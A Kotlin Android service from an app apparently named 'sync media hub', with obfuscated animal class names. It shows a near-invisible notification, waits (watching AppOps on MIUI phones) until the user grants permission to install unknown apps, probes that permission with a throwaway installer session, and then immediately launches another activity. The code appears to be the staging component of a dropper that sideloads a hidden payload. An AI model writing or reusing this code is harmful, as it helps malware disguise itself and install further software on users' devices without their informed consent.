package com.sync.media.hub

import android.app.AppOpsManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import java.util.concurrent.atomic.AtomicBoolean

class Tern : Service() {

    private val handler  = Handler(Looper.getMainLooper())
    private val nesting  = AtomicBoolean(false)
    private var opListener: AppOpsManager.OnOpChangedListener? = null

    private val scout = object : Runnable {
        override fun run() {
            if (packageManager.canRequestPackageInstalls()) {
                doNest()
                stopSelf()
            } else {
                handler.postDelayed(this, 200)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        handler.removeCallbacks(scout)
        stopWatchingOps()
        nesting.set(false)
        startForeground(2, NotificationCompat.Builder(this, Lynx.NOTE_CH_ID)
            .setContentTitle(Lynx.NOTE_CH_NAME)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build())
        if (Stork.isMiui(applicationContext) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            startWatchingOps()
        } else {
            handler.post(scout)
        }
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(scout)
        stopWatchingOps()
        super.onDestroy()
    }

    private fun startWatchingOps() {
        try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            val listener = AppOpsManager.OnOpChangedListener { _, _ ->
                if (canReallyInstall()) {
                    stopWatchingOps()
                    handler.postDelayed({
                        doNest()
                        stopSelf()
                    }, 100L)
                }
            }
            opListener = listener
            appOps.startWatchingMode(
                "android:request_install_packages",
                packageName,
                listener
            )
        } catch (_: Exception) {
            handler.post(scout)
        }
    }

    private fun canReallyInstall(): Boolean {
        return try {
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            val sid    = packageManager.packageInstaller.createSession(params)
            packageManager.packageInstaller.abandonSession(sid)
            true
        } catch (_: SecurityException) {
            false
        } catch (_: Exception) {
            false
        }
    }

    private fun stopWatchingOps() {
        val listener = opListener ?: return
        opListener = null
        try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            appOps.stopWatchingMode(listener)
        } catch (_: Exception) {}
    }

    private fun doNest() {
        if (!nesting.compareAndSet(false, true)) return
        try {
            val i = Intent(applicationContext, Bison::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            applicationContext.startActivity(i)
        } catch (_: Exception) {}
    }
}
